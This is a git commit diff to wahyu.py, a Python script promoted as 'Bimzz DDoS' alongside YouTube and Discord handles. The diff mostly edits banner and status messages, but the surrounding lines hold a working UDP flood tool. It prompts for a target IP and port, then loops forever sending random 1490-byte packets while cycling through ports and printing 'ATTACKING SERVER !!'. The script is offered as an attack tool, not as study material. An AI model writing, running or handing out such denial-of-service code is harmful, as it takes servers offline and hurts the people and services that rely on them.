92a11aa8c70099a3e039dd011a1f825221db4baa
LxvcTeam999 <91641569+LxvcTeam999@users.noreply.github.com>
2021-11-27 19:51:30 +0700

    Update wahyu.py

--- wahyu.py
+++ wahyu.py
@@ -8,24 +8,22 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
 os.system("clear")
-os.system("figlet Bimzz DDoS")
 print("""\u001b[31m
->>> YOUTUBE : Bimzz
->>>>> Discord : KyBimzZ  び#1716
->>>>>>>>> KyTeam : https://discord.gg/YMT9utYW5U""")
+>>> YouTube : Bimzz <<<
+>>> Discord : KyBimzZ  び#1716 <<<
+>>> KyTeam : https://discord.gg/YMT9utYW5U <<<""")
 
 ip = str(input("IP TARGET : "))
 port = int(input("PORT TARGET :"))
 
 os.system("clear")
-os.system("figlet Memulai Serangan!")
-print("Memulai Pengiriman Semua Packets Ke Server!")
+print("[Bimzz] | Wait 3s")
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print("[Bimzz] | Mengirim %s Pakets Ke IP : %s | PORT :%")(sent,ip,port)
+     print(" [Bimzz] | ATTACKING SERVER !! ")
      if port == 65534:
        port = 1
